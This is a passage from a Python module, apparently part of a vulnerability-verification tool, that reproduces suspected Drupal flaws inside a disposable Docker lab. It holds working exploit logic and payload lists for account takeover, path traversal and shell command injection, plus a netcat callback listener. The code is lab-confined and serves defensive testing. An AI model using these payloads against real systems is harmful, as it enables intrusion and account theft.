"""Dynamic verifier: el equivalente a wpverify.py pero para Drupal. Mismo contrato y mismo nivel
de exigencia (ver wpverify.py para la filosofia completa: nada se marca `verified` por un 200/302,
solo por una prueba real) -- este modulo es DELIBERADAMENTE una copia estructural, no una
abstraccion compartida: WordPress y Drupal difieren lo bastante (wp-cli vs Drush, add_action()/
wp_ajax vs *.routing.yml, wp-login.php vs el formulario con form_build_id de /user/login) que
intentar una base comun demasiado pronto arriesgaria romper el verificador de WordPress, ya
probado en produccion por el analista. Si el patron se repite para un tercer CMS, se extrae
entonces una base comun.

Primer paso ("poco a poco"): SOLO cubre missing-authorization/idor (account-takeover), el mismo
caso con el que empezo el soporte de WordPress. Las demas clases (path-traversal, sqli, xss...)
se añaden despues siguiendo el mismo patron que ya se aplico en wpverify.py.

Diferencia de arquitectura clave frente a WordPress: la imagen oficial `drupal:10-apache` NO trae
Drush, as que esto construye (una vez, cacheado) una imagen derivada con Drush instalado via
Composer -- ver drupal_lab/Dockerfile. Y como esa imagen YA tiene Drush instalado EN EL MISMO
contenedor que sirve Apache, no hace falta un volumen compartido ni un contenedor efimero
separado para las operaciones de "wp-cli" (a diferencia de WordPress, que necesita wordpress:cli
como imagen aparte): los comandos de Drush y la copia del modulo van directos por `docker exec`
contra el propio contenedor que esta vivo, igual que write_canary() ya hace en wpverify.py.

Requiere un Docker DAEMON alcanzable (mismo chequeo honesto que wpverify.py) y, la PRIMERA vez,
internet para construir la imagen de Drush (coste unico, cacheado despues)."""
from __future__ import annotations

import io
import os
import re
import secrets
import subprocess
import tarfile
import time
from dataclasses import dataclass
from typing import Callable, List, Optional

from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param,
                       _redirect_location_is_external, _token, _XssBrowserSession,
                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS, _PATH_HINTS, _CMD_HINTS, _SQLI_HINTS,
                       _URL_HINTS, _XSS_HINTS, _XML_HINTS, _REDIRECT_HINTS, _FILE_UPLOAD_HINTS)
from .payload_kb import load_xss_payloads

_MYSQL_IMAGE = "mysql:5.7"
_DRUPAL_DRUSH_IMAGE = "binoracle-drupal-drush:10"
_DRUPAL_DOCKERFILE_DIR = os.path.join(os.path.dirname(__file__), "drupal_lab")


def _run(cmd: List[str], timeout: float = 60.0, input_text=None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


def _image_exists(tag: str, timeout: float = 10.0) -> bool:
    try:
        r = _run(["docker", "image", "inspect", tag], timeout=timeout)
        return r.returncode == 0
    except Exception:
        return False


class _Lab:
    """Recursos Docker efimeros de una verificacion de Drupal (red + 2 contenedores). Sin volumen
    compartido -- ver docstring del modulo. Nunca deja nada vivo, tampoco si algo falla a mitad."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-drupalverify-{tag}"
        self.mysql = f"binoracle-drupalverify-{tag}-db"
        self.drupal = f"binoracle-drupalverify-{tag}-cms"
        self._created: List[tuple] = []

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def ensure_drush_image(self, step, timeout: float = 600.0) -> bool:
        """Construye la imagen derivada con Drush SOLO si no esta ya cacheada -- coste de red
        unico, igual que un `docker pull` la primera vez (ver modulo docstring)."""
        if _image_exists(_DRUPAL_DRUSH_IMAGE):
            step(f"imagen '{_DRUPAL_DRUSH_IMAGE}' ya cacheada, no hace falta construirla de nuevo.")
            return True
        step(f"construyendo '{_DRUPAL_DRUSH_IMAGE}' (drupal:10-apache + Drush via Composer) -- "
             f"solo la primera vez, necesita internet; quedara cacheada para las siguientes...")
        r = self.sh("build", "-t", _DRUPAL_DRUSH_IMAGE, _DRUPAL_DOCKERFILE_DIR, timeout=timeout)
        if r.returncode != 0:
            step(f"fallo construyendo la imagen de Drush: {(r.stderr or r.stdout or '')[-800:]}")
            return False
        return True

    def setup_network(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=drupal",
               "-e", "MYSQL_USER=drupal", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        # mismo margen generoso que wpverify.py: InnoDB bajo emulacion (Apple Silicon) puede
        # tardar varios minutos en el primer arranque.
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-udrupal",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_drupal(self) -> Optional[str]:
        """Publica el puerto 80 en un puerto aleatorio de 0.0.0.0 -- mismo razonamiento de
        Docker-fuera-de-Docker que start_wordpress() en wpverify.py (ver _lab_host())."""
        self.sh("run", "-d", "--name", self.drupal, "--network", self.net, "--platform", "linux/amd64",
               "-p", "0.0.0.0::80", _DRUPAL_DRUSH_IMAGE, timeout=90)
        self._created.append(("container", self.drupal))
        r = self.sh("port", self.drupal, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def http_ready(self, port: str, tries: int = 150, delay: float = 3.0) -> bool:
        import urllib.request
        url = f"http://{_lab_host()}:{port}/user/login"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 40) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def drush(self, *args, timeout: float = 120.0) -> subprocess.CompletedProcess:
        """Drush ya vive EN el propio contenedor Apache (imagen derivada, ver modulo docstring) --
        un simple `docker exec`, sin contenedor aparte ni volumen compartido."""
        return self.sh("exec", "-w", "/opt/drupal", self.drupal, "vendor/bin/drush", *args,
                       timeout=timeout)

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        r = self.sh("exec", "-i", self.drupal, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Igual que start_listener() en wpverify.py: un contenedor 'callback' en la MISMA red
        del laboratorio, para confirmar SSRF por una conexion saliente real registrada con un
        token unico."""
        self.listener = f"binoracle-drupalverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, "alpine:3.20",
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{self.net}\").IPAddress}}}}",
                   name, timeout=timeout)
        ip = (r.stdout or "").strip()
        return ip or None

    def find_in_webroot(self, token: str, timeout: float = 10.0) -> Optional[str]:
        """Analogo a find_in_webroot() en wpverify.py pero para la carpeta de ficheros publicos
        de Drupal (sites/default/files, el destino de 'public://' -- el stream wrapper que
        practicamente todo formulario de subida de Drupal usa por defecto)."""
        r = self.sh("exec", self.drupal, "sh", "-c",
                   f"find /opt/drupal/web/sites/default/files -iname '*{token}*' -type f "
                   f"2>/dev/null | head -1", timeout=timeout)
        p = (r.stdout or "").strip()
        return p or None

    def install_module(self, host_module_dir: str, slug: str, timeout: float = 60.0) -> bool:
        """Empaqueta el modulo (ya descargado en `host_module_dir`, que contiene <slug>/...) en un
        tar EN MEMORIA y lo pasa por stdin directamente a `docker exec -i` del contenedor Drupal
        YA vivo -- a diferencia de install_plugin() en wpverify.py, no hace falta un contenedor
        Alpine aparte ni un volumen con nombre, porque aqui no hay un segundo contenedor que
        necesite ver el mismo filesystem (Drush corre dentro del propio contenedor Apache)."""
        module_path = os.path.join(host_module_dir, slug)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            tf.add(module_path, arcname=slug)
        try:
            # input_text de self.sh/_run espera texto; el tar es binario, asi que se llama a
            # subprocess.run directamente (mismo patron que install_plugin() en wpverify.py).
            r = subprocess.run(
                ["docker", "exec", "-i", self.drupal, "sh", "-c",
                 "mkdir -p /opt/drupal/web/modules/custom && "
                 "tar -xf - -C /opt/drupal/web/modules/custom"],
                input=buf.getvalue(), capture_output=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return False
        return r.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
            except Exception:
                pass


def _drupal_login(base_url: str, user: str, password: str, timeout: float = 15.0):
    """Login real por el FORMULARIO de /user/login (no un shortcut de Drush): Drupal exige un
    `form_build_id` valido, obtenido de un GET previo a la misma pagina -- sin el, el POST se
    rechaza silenciosamente. Devuelve una sesion logueada (requests.Session) con la cookie
    SESS*/SSESS* presente, o None si el login fallo.

    requests.Session() DIRECTAMENTE, nunca _make_session() -- este login es parte del
    laboratorio efimero, que nunca debe ir por Burp aunque este configurado (ver _lab_host() en
    wpverify.py)."""
    import requests
    s = requests.Session()
    try:
        r0 = s.get(f"{base_url}/user/login", timeout=timeout)
        m = re.search(r'name="form_build_id"\s+value="([^"]+)"', r0.text or "")
        form_build_id = m.group(1) if m else ""
        s.post(f"{base_url}/user/login", data={
            "name": user, "pass": password, "form_id": "user_login_form",
            "form_build_id": form_build_id, "op": "Log in",
        }, timeout=timeout, allow_redirects=True)
    except Exception:
        return None
    logged_in = any(c.name.startswith(("SESS", "SSESS")) for c in s.cookies)
    return s if logged_in else None


def _substitute_path_param(endpoint: str, param_name: str, value: str) -> "tuple[str, bool]":
    """Si `{param_name}` aparece LITERAL dentro de `endpoint` (la convencion de ruta de Symfony/
    Drupal, p.ej. '/mymodule/update/{uid}'), lo sustituye por `value` y devuelve
    (endpoint_sustituido, True) -- esto es lo que hace falta cuando el ID objetivo viene
    enlazado como ARGUMENTO del metodo del controlador por el propio enrutador, no como un
    parametro de query/body que el codigo lea con $request->get(). Si el placeholder no aparece
    en el endpoint, lo devuelve sin tocar y (endpoint, False): el caller entonces sabe que debe
    mandar `param_name` como parametro normal, igual que antes."""
    if not param_name:
        return endpoint, False
    token = "{" + param_name + "}"
    if token in endpoint:
        return endpoint.replace(token, value), True
    return endpoint, False


def _check_prereqs(module_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable (o sin CLI de docker instalado)"
        res.limitations.append("verificacion dinamica NO intentada: revisa que Docker Desktop/"
                               "dockerd este arrancado y, si binoracle corre dentro de Docker, "
                               "que el socket del host este montado en docker-compose.yml")
        return res
    if not os.path.isdir(os.path.join(module_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {module_source_dir}"
        res.limitations.append("el codigo del modulo no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _DrupalLabSession:
    lab: "_Lab"
    base_url: str
    admin_user: str
    admin_pass: str
    sub_user: str
    sub_pass: str
    sub_sess: object
    admin_sess: object


def _bootstrap_drupal_lab(lab: "_Lab", module_source_dir: str, slug: str, step,
                          res: WpVerifyResult, t0: float,
                          budget_s: float) -> Optional[_DrupalLabSession]:
    """Pasos 1-4 compartidos, analogos a _bootstrap_lab() en wpverify.py: Drupal instalado, modulo
    activo, usuario de bajo privilegio creado y logueado. Devuelve None si algo falla, con `res`
    ya relleno."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)

    if not lab.ensure_drush_image(step):
        res.detail = "no se pudo construir/encontrar la imagen de Drupal+Drush"
        return None

    step("levantando laboratorio Drupal+MySQL aislado en Docker (red propia)...")
    lab.setup_network()
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        return None
    step("MySQL listo; arrancando Drupal...")
    port = lab.start_drupal()
    if not port:
        res.detail = "no se pudo publicar el puerto de Drupal"
        res.logs.append("docker logs (drupal):\n" + lab.logs_tail(lab.drupal))
        return None
    if not lab.http_ready(port):
        res.detail = "Drupal no respondio a tiempo"
        res.logs.append("docker logs (drupal):\n" + lab.logs_tail(lab.drupal))
        return None
    base_url = f"http://{_lab_host()}:{port}"
    step(f"Drupal listo en {base_url}; instalando el sitio via Drush (site:install)...")

    r = lab.drush("site:install", "standard",
                 f"--db-url=mysql://drupal:{db_pw}@{lab.mysql}/drupal",
                 f"--account-name={admin_user}", f"--account-pass={admin_pass}",
                 "--site-name=binoracle-lab", "-y", timeout=180)
    if r.returncode != 0:
        res.detail = f"drush site:install fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None
    step("Drupal instalado (el admin creado por site:install es siempre uid=1, superusuario -- "
         "el mismo papel que juega el admin en el laboratorio de WordPress).")

    step(f"copiando el modulo ({slug}) al contenedor y activandolo...")
    if not lab.install_module(module_source_dir, slug):
        res.detail = "no se pudo copiar el modulo al laboratorio"
        return None
    r = lab.drush("pm:enable", slug, "-y", timeout=60)
    if r.returncode != 0:
        res.detail = f"activacion del modulo fallo: {(r.stderr or r.stdout or '')[:300]}"
        res.limitations.append("si el slug/version descargados no coinciden con el afectado, o "
                               "el modulo trae dependencias no instaladas, pm:enable puede fallar")
        return None
    step("modulo activo. Creando el usuario de bajo privilegio...")

    r = lab.drush("user:create", sub_user, f"--mail={sub_user}@binoracle-lab.invalid",
                 f"--password={sub_pass}", timeout=30)
    if r.returncode != 0:
        res.detail = f"creacion del usuario de bajo privilegio fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None

    if budget_s - (time.time() - t0) < 30:
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio, via el formulario real de "
         f"/user/login)...")
    sub_sess = _drupal_login(base_url, sub_user, sub_pass)
    if sub_sess is None:
        res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")

    admin_sess = _drupal_login(base_url, admin_user, admin_pass)

    return _DrupalLabSession(lab=lab, base_url=base_url, admin_user=admin_user,
                             admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                             sub_sess=sub_sess, admin_sess=admin_sess)


def verify_drupal_account_takeover(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Equivalente Drupal de verify_wordpress_account_takeover: un modulo donde un usuario
    autenticado de bajo privilegio puede cambiar el email/password de OTRO usuario (uid=1, el
    superusuario que `drush site:install` crea) porque el controlador confia en un uid del
    request en vez de comprobarlo contra la sesion real. `verified` SOLO pasa a True con un
    SEGUNDO login independiente, con la password que esta misma ejecucion fijo -- igual de
    exigente que el equivalente de WordPress, nunca por un 200/302."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    params = parameters
    id_p = id_param_hint or _pick_param(params, _ID_HINTS)
    email_p = email_param_hint or _pick_param(params, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(params, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita un parametro de "
                               "email o de password; afina 'parameters' en la hipotesis del LLM "
                               "o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        admin_uid = "1"   # drush site:install SIEMPRE crea el primer usuario como uid=1
        m = (http_method or "POST").upper()
        payload = dict(params) if isinstance(params, dict) else dict.fromkeys(params or [], "")
        path_substituted = False
        if id_p:
            endpoint, path_substituted = _substitute_path_param(endpoint, id_p, admin_uid)
            if path_substituted:
                step(f"'{id_p}' es un parametro de RUTA (viene de *.routing.yml, no de "
                     f"$request->get()) -- sustituido directamente en la URL: {endpoint}")
            else:
                payload[id_p] = admin_uid
        new_email = f"takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_uid_objetivo": admin_uid, "payload_enviado": payload,
            "metodo": m, "endpoint": endpoint,
        })
        step(f"enviando la peticion -- sesion de '{boot.sub_user}' (bajo privilegio) contra "
             f"{m} {endpoint}, apuntando al uid={admin_uid}...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.evidence["status_code_respuesta"] = resp.status_code
        except Exception as e:
            res.detail = f"la peticion fallo: {e}"
            return res

        confirmed = False
        if new_pass:
            step("confirmando: intentando iniciar sesion de nuevo como el admin con la password "
                 "NUEVA (la que esta peticion fijo)...")
            confirm_sess = _drupal_login(boot.base_url, boot.admin_user, new_pass)
            confirmed = confirm_sess is not None
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            step("confirmando: releyendo el registro del usuario (uid=1) via Drush para "
                 "comprobar el email cambiado...")
            r = lab.drush("user:information", boot.admin_user, "--format=json", timeout=30)
            actual_email = ""
            try:
                import json as _json
                info = _json.loads(r.stdout or "{}")
                first = next(iter(info.values())) if isinstance(info, dict) and info else {}
                actual_email = (first.get("mail") or "").strip()
            except Exception:
                pass
            confirmed = actual_email == new_email
            res.evidence["email_tras_peticion"] = actual_email
            res.evidence["email_esperado"] = new_email

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: la sesion de bajo privilegio "
                          f"('{boot.sub_user}') cambio de verdad la cuenta del superusuario "
                          f"(uid={admin_uid}) -- confirmado por un SEGUNDO login/lectura "
                          f"independiente, no por el codigo de la respuesta")
            step("VERIFICADO: account takeover confirmado en Drupal.")
        else:
            res.ok = True
            res.detail = ("se envio la peticion pero el efecto no se confirmo -- el account "
                          "takeover no se confirmo (puede que el endpoint/parametro no sean los "
                          "reales, o que el controlador si compruebe el uid contra la sesion)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_path_traversal(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, path_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Segunda clase de Drupal ("poco a poco"): equivalente a verify_wordpress_path_traversal
    (mismo patron de fichero canario con secreto aleatorio). Planta un secreto en una ruta REAL
    del sistema de ficheros del contenedor (fuera de web/, via write_canary -- docker exec
    directo, no toca el modulo ni la base de datos), y confirma que el endpoint lo filtra literal
    al pedirlo con varias profundidades/codificaciones de '../' -- no una deduccion por status
    code. Mismo catalogo de variantes que la version de WordPress (URL-encoded, doble-encoded,
    backslash, bypass '....//' , null-byte), porque el sistema de ficheros subyacente (Linux) es
    el mismo; lo unico que cambia es que el usuario que ataca es un usuario Drupal autenticado de
    bajo privilegio en vez de un subscriber de WordPress."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor, fuera del docroot)...")
        if not lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        rel = canary_path.lstrip("/")
        depths = (2, 4, 6, 8, 10, 12)
        attempts = [rel, canary_path]
        attempts += [("../" * n) + rel for n in depths]
        attempts += [("..%2f" * n) + rel for n in depths]
        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
        attempts += [("..\\" * n) + rel for n in depths]
        attempts += [("....//" * n) + rel for n in depths]
        attempts += [rel + "%00", canary_path + "%00"]

        found = False
        tried = []
        first_resp_captured = False
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[path_param] = payload_value
            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            if not first_resp_captured:
                # recorte del primer intento -- evidencia que lee el bucle de aprendizaje-y-
                # reintento del LLM cuando nada se confirma (ver verify_generic_path_traversal,
                # mismo fix aplicado aqui).
                res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                first_resp_captured = True
            tried.append({"payload": payload_value, "status": resp.status_code,
                          "secret_presente": secret in (resp.text or "")})
            if secret in (resp.text or ""):
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                     f"{path_param}={payload_value!r}.")
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
                          f"plantado en {canary_path} (fuera del docroot)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de ruta/codificacion para "
                          f"{path_param} y ninguna devolvio el secreto plantado -- el traversal "
                          f"no se confirmo (puede necesitar otra profundidad de '../', otra "
                          f"codificacion, o el endpoint/parametro no son los reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_command_injection(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, cmd_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Tercera clase de Drupal ("poco a poco"): equivalente a verify_wordpress_command_injection.
    Misma prueba dura (el payload pide `$(( a + b ))` para dos numeros aleatorios; si la SUMA, que
    nunca aparece en el payload enviado, sale en la respuesta, es prueba de ejecucion real de un
    shell remoto) y el mismo fallback ciego por temporizacion (sleep) cuando la salida nunca se
    refleja -- la logica de deteccion no depende del CMS, solo el laboratorio que la rodea."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    cmd_param = cmd_param_hint or _pick_param(parameters, _CMD_HINTS)
    if not cmd_param:
        res.detail = "no se identifico el parametro que llega al comando del sistema"
        res.limitations.append("la verificacion de command injection necesita saber que "
                               "parametro llega al comando; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (cmd_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
        expected = a + b
        calc = f"$(( {a} + {b} ))"
        attempts = [
            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}", f"|| echo {calc}",
            f"\necho {calc}\n", f"\r\necho {calc}\r\n",
            f"`echo {calc}`", f"$(echo {calc})",
            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "',
            f"' && echo {calc} && echo '", f'" && echo {calc} && echo "',
            f"' | echo {calc} #", f'" | echo {calc} #',
            f";echo${{IFS}}{calc}", f";echo%09{calc}",
            f"; powershell -c \"{calc}\"", f"| powershell -c \"{calc}\"",
            f"echo {calc}", calc,
        ]
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "cmd_param": cmd_param, "a": a, "b": b, "suma_esperada": expected,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
        found = False
        tried = []
        first_resp_captured = False
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[cmd_param] = payload_value
            step(f"probando {m} {endpoint} con {cmd_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            if not first_resp_captured:
                res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                first_resp_captured = True
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code, "suma_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {expected} (={a}+{b}), calculado por un "
                     f"shell remoto -- ese numero no aparece en el payload enviado.")
                break
        res.evidence["intentos"] = tried

        sleep_evidence = None
        if not found:
            step("ninguna variante reflejo la suma; probando blind command injection por "
                 "temporizacion (sleep)...")
            base_payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            base_payload[cmd_param] = "1"
            try:
                t_base0 = time.time()
                boot.sub_sess.request(m, boot.base_url + endpoint,
                                      data=base_payload if m != "GET" else None,
                                      params=base_payload if m == "GET" else None, timeout=20)
                baseline_s = time.time() - t_base0
            except Exception:
                baseline_s = None
            sleep_n = 6
            sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
                              f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
            for sp in sleep_attempts:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[cmd_param] = sp
                step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
                try:
                    t0_s = time.time()
                    boot.sub_sess.request(m, boot.base_url + endpoint,
                                          data=payload if m != "GET" else None,
                                          params=payload if m == "GET" else None,
                                          timeout=sleep_n + 15)
                    elapsed = time.time() - t0_s
                except Exception:
                    continue
                delayed = (baseline_s is not None and elapsed - baseline_s >= sleep_n - 1.5)
                sleep_evidence = {"payload": sp, "baseline_s": round(baseline_s, 2) if baseline_s else None,
                                  "elapsed_s": round(elapsed, 2), "retraso_consistente": delayed}
                if delayed:
                    found = True
                    res.evidence["payload_ganador"] = sp
                    res.evidence["tecnica"] = "blind-timing"
                    step(f"VERIFICADO (blind/timing): la peticion con {sp!r} tardo {elapsed:.1f}s "
                         f"frente a {baseline_s:.1f}s de control.")
                    break
            res.evidence["blind_timing_intento"] = sleep_evidence

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "blind-timing":
                res.detail = (f"COMMAND INJECTION confirmada (blind/timing): la peticion con "
                              f"{cmd_param}={res.evidence['payload_ganador']!r} retraso la "
                              f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
                              f"de verdad en un shell remoto")
            else:
                res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
                              f"{res.evidence['payload_ganador']!r} hizo que el servidor "
                              f"EJECUTARA {a}+{b} y devolviera {expected} en la respuesta")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de inyeccion (aritmetica "
